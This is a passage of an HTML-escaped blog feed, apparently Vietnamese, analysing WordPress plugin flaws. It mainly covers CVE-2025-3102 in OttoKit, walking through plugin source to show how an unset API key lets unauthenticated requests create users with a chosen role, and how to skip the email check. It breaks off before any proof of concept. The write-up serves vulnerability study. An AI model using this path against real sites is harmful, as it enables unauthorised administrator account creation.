id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng bao gi·ªù &lt;strong&gt;tin d·ªØ li·ªáu thanh to√°n t·ª´ ph√≠a client&lt;/strong&gt; ƒë·ªÉ x√°c nh·∫≠n giao d·ªãch.&lt;/li&gt;&#xA;&lt;li&gt;B·∫Øt bu·ªôc ph·∫£i c√≥ &lt;strong&gt;x√°c minh ph√≠a m√°y ch·ªß v·ªõi c·ªïng thanh to√°n&lt;/strong&gt; tr∆∞·ªõc khi c·∫≠p nh·∫≠t tr·∫°ng th√°i.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce ch·ªâ ch·ªëng CSRF&lt;/strong&gt;, kh√¥ng ngƒÉn ƒë∆∞·ª£c vi·ªác l·ª£i d·ª•ng logic nghi·ªáp v·ª•.&lt;/li&gt;&#xA;&lt;li&gt;C√°c endpoint d√πng &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; c·∫ßn ƒë∆∞·ª£c xem nh∆∞ &lt;strong&gt;API c√¥ng khai&lt;/strong&gt; v√† ph·∫£i ki·ªÉm tra d·ªØ li·ªáu r·∫•t ch·∫∑t ch·∫Ω.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Bypass Vulnerability&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/hydra-booking/vulnerability/wordpress-hydra-booking-plugin-1-1-27-missing-payment-verification-to-unauthenticated-payment-bypass-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hydra Booking Plugin &amp;lt;= 1.1.27 is vulnerable to Bypass Vulnerability&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3102 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-14-cve-2025-3102/</link>
      <pubDate>Wed, 14 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-14-cve-2025-3102/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-14-cve-2025-3102/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3102&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3102&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Bypass Vulnerability&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.0.78&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.0.79&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/suretriggers/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress OttoKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;OttoKit&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.0.78&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.0.79&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω API nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$rest_controller_obj         = RestController::get_instance();&#xA;register_rest_route(&#xA;    SURE_TRIGGERS_REST_NAMESPACE, // sure-triggers/v1&#xA;    &amp;#39;automation/action&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE, // POST, PUT, PATCH&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; [ $rest_controller_obj, &amp;#39;run_action&amp;#39; ],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $rest_controller_obj, &amp;#39;autheticate_user&amp;#39; ],&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi c·∫•u h√¨nh tr√™n, API endpoint ƒë·∫ßy ƒë·ªß s·∫Ω c√≥ d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/sure-triggers/v1/automation/action&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi c√≥ request ƒë·∫øn endpoint tr√™n v·ªõi method h·ª£p l·ªá th√¨ callback &lt;code&gt;run_action&lt;/code&gt; nh∆∞ng tr∆∞·ªõc h·∫øt c·∫ßn v∆∞·ª£t qua h√†m ki·ªÉm tra quy·ªÅn &lt;code&gt;autheticate_user&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function autheticate_user( $request ) {&#xA;    $secret_key       = $request-&amp;gt;get_header( &amp;#39;st_authorization&amp;#39; );&#xA;    list($secret_key) = sscanf( $secret_key, &amp;#39;Bearer %s&amp;#39; );&#xA;&#xA;    if ( $this-&amp;gt;secret_key !== $secret_key ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;autheticate_user&lt;/code&gt; d√πng ƒë·ªÉ x√°c th·ª±c ng∆∞·ªùi d√πng d·ª±a tr√™n m·ªôt secret key ƒë∆∞·ª£c g·ª≠i l√™n trong HTTP header.&lt;/p&gt;&#xA;&lt;p&gt;Client s·∫Ω g·ª≠i header d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;st_authorization: Bearer ABC123SECRET&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Server s·∫Ω l·∫•y &lt;code&gt;ABC123SECRET&lt;/code&gt; ra ƒë·ªÉ so s√°nh v·ªõi secret key ƒë√£ l∆∞u trong h·ªá th·ªëng.&lt;/p&gt;&#xA;&lt;p&gt;Khi plugin ƒë∆∞·ª£c &lt;strong&gt;install&lt;/strong&gt; v√† &lt;strong&gt;active&lt;/strong&gt; nh∆∞ng ch∆∞a c·∫•u h√¨nh API key&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-14-cve-2025-3102/ianda.png&#34; title=&#34;Not set API key&#34; data-thumbnail=&#34;/posts/2026-01-14-cve-2025-3102/ianda.png&#34; data-sub-html=&#34;&lt;h2&gt;Not connect&lt;/h2&gt;&lt;p&gt;Not set API key&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-14-cve-2025-3102/ianda.png&#39; alt=&#34;Not connect&#34; height=&#34;1118&#34; width=&#34;1911&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Not set API key&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bi·∫øn &lt;code&gt;$this-&amp;gt;secret_key&lt;/code&gt; s·∫Ω c√≥ gi√° tr·ªã &lt;code&gt;null&lt;/code&gt;. N·∫øu attacker g·ª≠i request kh√¥ng c√≥ header h·ª£p l·ªá, gi√° tr·ªã &lt;code&gt;$secret_key&lt;/code&gt; l·∫•y t·ª´ request c≈©ng s·∫Ω l√† &lt;code&gt;null&lt;/code&gt;. Khi so s√°nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// st_authorization: Bearer &#xA;&#xA;$this-&amp;gt;secret_key !== $secret_key   // null !== null ‚Üí false&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán ki·ªÉm tra th·∫•t b·∫°i v√† h√†m tr·∫£ v·ªÅ &lt;code&gt;true&lt;/code&gt;, d·∫´n ƒë·∫øn bypass x√°c th·ª±c.&lt;/p&gt;&#xA;&lt;p&gt;Khi ƒë√≥ &lt;code&gt;run_action&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω request&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function run_action( $request ) {&#xA;    $request-&amp;gt;get_param( &amp;#39;wp_user_id&amp;#39; );&#xA;&#xA;    $user_id          = $request-&amp;gt;get_param( &amp;#39;wp_user_id&amp;#39; );&#xA;    $automation_id    = $request-&amp;gt;get_param( &amp;#39;automation_id&amp;#39; );&#xA;    $integration      = $request-&amp;gt;get_param( &amp;#39;integration&amp;#39; );&#xA;    $action_type      = $request-&amp;gt;get_param( &amp;#39;type_event&amp;#39; );&#xA;    $selected_options = $request-&amp;gt;get_param( &amp;#39;selected_options&amp;#39; );&#xA;    $context          = $request-&amp;gt;get_param( &amp;#39;context&amp;#39; );&#xA;    $fields           = $request-&amp;gt;get_param( &amp;#39;fields&amp;#39; );&#xA;&#xA;    if ( empty( $user_id ) ) {&#xA;        $user_id = isset( $context[&amp;#39;pluggable_data&amp;#39;][&amp;#39;wp_user_id&amp;#39;] ) ? sanitize_text_field( $context[&amp;#39;pluggable_data&amp;#39;][&amp;#39;wp_user_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    if ( empty( $integration ) || empty( $action_type ) ) {&#xA;        return self::error_message( &amp;#39;Integration or action type is missing&amp;#39; );&#xA;    }&#xA;&#xA;    if ( isset( $selected_options[&amp;#39;wp_user_email&amp;#39;] ) &amp;amp;&amp;amp; ! ( &amp;#39;EDD&amp;#39; === $integration &amp;amp;&amp;amp; &amp;#39;find_user_purchased_download&amp;#39; === $action_type ) ) {&#xA;        $is_valid = WordPress::validate_email( $selected_options[&amp;#39;wp_user_email&amp;#39;] );&#xA;&#xA;        if ( ! $is_valid-&amp;gt;valid ) {&#xA;            if ( $is_valid-&amp;gt;multiple ) {&#xA;                return self::error_message( &amp;#39;One or more email address is not valid.&amp;#39; );&#xA;            } else {&#xA;                return self::error_message( &amp;#39;Email address is not valid.&amp;#39; );&#xA;            }&#xA;        }&#xA;&#xA;        if ( str_contains( $selected_options[&amp;#39;wp_user_email&amp;#39;], &amp;#39;,&amp;#39; ) ) {&#xA;            $email_list = explode( &amp;#39;,&amp;#39;, $selected_options[&amp;#39;wp_user_email&amp;#39;] );&#xA;&#xA;            foreach ( $email_list as $single_email ) {&#xA;                if ( ! email_exists( trim( $single_email ) ) ) {&#xA;                    return self::error_message( &amp;#39;User with email &amp;#39; . $single_email . &amp;#39; does not exists.&amp;#39; );&#xA;                }&#xA;            }&#xA;        } else {&#xA;            if ( ! email_exists( $selected_options[&amp;#39;wp_user_email&amp;#39;] ) ) {&#xA;                return self::error_message( &amp;#39;User with email &amp;#39; . $selected_options[&amp;#39;wp_user_email&amp;#39;] . &amp;#39; does not exists.&amp;#39; );&#xA;            }&#xA;        }&#xA;    }&#xA;    $registered_actions = EventController::get_instance()-&amp;gt;actions;&#xA;    $action_event       = $registered_actions[ $integration ][ $action_type ];&#xA;&#xA;    $fun_params = [&#xA;        $user_id,&#xA;        $automation_id,&#xA;        $fields,&#xA;        $selected_options,&#xA;        $context,&#xA;    ];&#xA;&#xA;    try {&#xA;        $result = call_user_func_array(&#xA;            $action_event[&amp;#39;function&amp;#39;],&#xA;            $fun_params&#xA;        );&#xA;        return self::success_message( $result );&#xA;    } catch ( Exception $e ) {&#xA;        return self::error_message( $e-&amp;gt;getMessage(), 400 );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;run_action()&lt;/code&gt; b·∫Øt ƒë·∫ßu b·∫±ng vi·ªác tr√≠ch xu·∫•t c√°c tham s·ªë c·∫ßn thi·∫øt th√¥ng qua &lt;code&gt;$request-&amp;gt;get_param()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu &lt;code&gt;wp_user_id&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp, h·ªá th·ªëng fallback sang gi√° tr·ªã trong &lt;code&gt;context[&#39;pluggable_data&#39;][&#39;wp_user_id&#39;]&lt;/code&gt;. ƒêi·ªÅu n√†y gi√∫p ƒë·∫£m b·∫£o lu√¥n c√≥ user context ƒë·ªÉ x·ª≠ l√Ω h√†nh ƒë·ªông.&lt;/p&gt;&#xA;&lt;p&gt;Ti·∫øp theo, h·ªá th·ªëng ki·ªÉm tra d·ªØ li·ªáu b·∫Øt bu·ªôc. N·∫øu &lt;code&gt;integration&lt;/code&gt; ho·∫∑c &lt;code&gt;type_event&lt;/code&gt; b·ªã thi·∫øu, h√†m s·∫Ω d·ª´ng ngay v√† tr·∫£ v·ªÅ l·ªói. Sau ƒë√≥, n·∫øu t·ªìn t·∫°i &lt;code&gt;selected_options[&#39;wp_user_email&#39;]&lt;/code&gt;, h·ªá th·ªëng ti·∫øn h√†nh validate email: ki·ªÉm tra ƒë·ªãnh d·∫°ng h·ª£p l·ªá, t√°ch danh s√°ch email n·∫øu c√≥ nhi·ªÅu gi√° tr·ªã, v√† x√°c minh email c√≥ t·ªìn t·∫°i trong WordPress hay kh√¥ng.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;M·∫πo&lt;/p&gt;&lt;p&gt;Ta c√≥ th·ªÉ kh√¥ng truy·ªÅn &lt;code&gt;wp_user_email&lt;/code&gt; ƒë·ªÉ bypass qua ki·ªÉm tra n√†y&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Sau khi v∆∞·ª£t qua to√†n b·ªô b∆∞·ªõc ki·ªÉm tra d·ªØ li·ªáu, h·ªá th·ªëng l·∫•y danh s√°ch action ƒë√£ ƒëƒÉng k√Ω th√¥ng qua Singleton:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;EventController::get_instance()-&amp;gt;actions&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Danh s√°ch n√†y l√† m·ªôt m·∫£ng √°nh x·∫° gi·ªØa &lt;code&gt;integration&lt;/code&gt; v√† &lt;code&gt;action_type&lt;/code&gt;, trong ƒë√≥ m·ªói action ch·ª©a m·ªôt callable function t∆∞∆°ng ·ª©ng.&lt;/p&gt;&#xA;&lt;p&gt;D·ª±a tr√™n gi√° tr·ªã &lt;code&gt;integration&lt;/code&gt; v√† &lt;code&gt;type_event&lt;/code&gt; t·ª´ request, h·ªá th·ªëng x√°c ƒë·ªãnh action c·∫ßn th·ª±c thi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$action_event = $registered_actions[$integration][$action_type];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Callable function ƒë∆∞·ª£c tr√≠ch xu·∫•t t·ª´:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$action_event[&amp;#39;function&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ti·∫øp theo, c√°c tham s·ªë truy·ªÅn v√†o function ƒë∆∞·ª£c ƒë√≥ng g√≥i trong m·∫£ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$user_id,&#xA;$automation_id,&#xA;$fields,&#xA;$selected_options,&#xA;$context&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cu·ªëi c√πng, h√†m ƒë√≠ch ƒë∆∞·ª£c g·ªçi ƒë·ªông b·∫±ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;call_user_func_array($action_event[&amp;#39;function&amp;#39;], $fun_params);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C∆° ch·∫ø n√†y cho ph√©p h·ªá th·ªëng th·ª±c thi linh ho·∫°t nhi·ªÅu action kh√°c nhau ch·ªâ d·ª±a tr√™n d·ªØ li·ªáu truy·ªÅn t·ª´ request, thay v√¨ hard-code t·ª´ng h√†m c·ª• th·ªÉ. K·∫øt qu·∫£ tr·∫£ v·ªÅ t·ª´ function s·∫Ω ƒë∆∞·ª£c ƒë√≥ng g√≥i th√†nh response th√†nh c√¥ng, ho·∫∑c tr·∫£ l·ªói n·∫øu qu√° tr√¨nh th·ª±c thi ph√°t sinh exception.&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu th·ª±c s·ª± ƒëi√™n r·ªì khi &lt;code&gt;integration&lt;/code&gt; l√† &lt;code&gt;WordPress&lt;/code&gt; v√† &lt;code&gt;create_user_if_not_exists&lt;/code&gt; th√¨ h√†nh ƒë·ªông t·∫°o user m·ªõi n·∫øu user ch∆∞a t·ªìn t·∫°i s·∫Ω ƒë∆∞·ª£c tri·ªÉn khai.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-14-cve-2025-3102/new_user.png&#34; title=&#34;New user&#34; data-thumbnail=&#34;/posts/2026-01-14-cve-2025-3102/new_user.png&#34; data-sub-html=&#34;&lt;h2&gt;New user&lt;/h2&gt;&lt;p&gt;New user&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-14-cve-2025-3102/new_user.png&#39; alt=&#34;New user&#34; height=&#34;692&#34; width=&#34;1488&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;New user&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi &lt;code&gt;call_user_func_array&lt;/code&gt; ƒë∆∞·ª£c g·ªçi, &lt;code&gt;_action_listener&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c k√≠ch ho·∫°t:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function _action_listener( $user_id, $automation_id, $fields, $selected_options ) {&#xA;    $email     = sanitize_email( $selected_options[&amp;#39;user_email&amp;#39;] );&#xA;    $user_name = sanitize_text_field( $selected_options[&amp;#39;user_name&amp;#39;] );&#xA;&#xA;    /**&#xA;     * User Data&#xA;     */&#xA;    &#xA;    $user_pass = empty( $selected_options[&amp;#39;password&amp;#39;] ) ? wp_generate_password() : $selected_options[&amp;#39;password&amp;#39;];&#xA;    &#xA;    $userdata               = [&#xA;        &amp;#39;user_login&amp;#39; =&amp;gt; $selected_options[&amp;#39;user_name&amp;#39;],&#xA;        &amp;#39;user_email&amp;#39; =&amp;gt; $email,&#xA;        &amp;#39;first_name&amp;#39; =&amp;gt; $selected_options[&amp;#39;first_name&amp;#39;],&#xA;        &amp;#39;last_name&amp;#39;  =&amp;gt; $selected_options[&amp;#39;last_name&amp;#39;],&#xA;        &amp;#39;user_pass&amp;#39;  =&amp;gt; $user_pass,&#xA;        &amp;#39;role&amp;#39;       =&amp;gt; $selected_options[&amp;#39;role&amp;#39;],&#xA;    ];&#xA;    $force_update_user_role = $selected_options[&amp;#39;force_update_user_role&amp;#39;] ? &amp;#39;yes&amp;#39; : &amp;#39;no&amp;#39;;&#xA;&#xA;    $add_user_roles = $selected_options[&amp;#39;add_user_roles&amp;#39;] ? &amp;#39;yes&amp;#39; : &amp;#39;no&amp;#39;;&#xA;    $show_password  = $selected_options[&amp;#39;show_password&amp;#39;];&#xA;&#xA;    $user = get_user_by( &amp;#39;email&amp;#39;, $email );&#xA;    if ( ! $user ) {&#xA;        $user = get_user_by( &amp;#39;login&amp;#39;, $user_name );&#xA;    }&#xA;    &#xA;    if ( $user ) {&#xA;        ...&#xA;        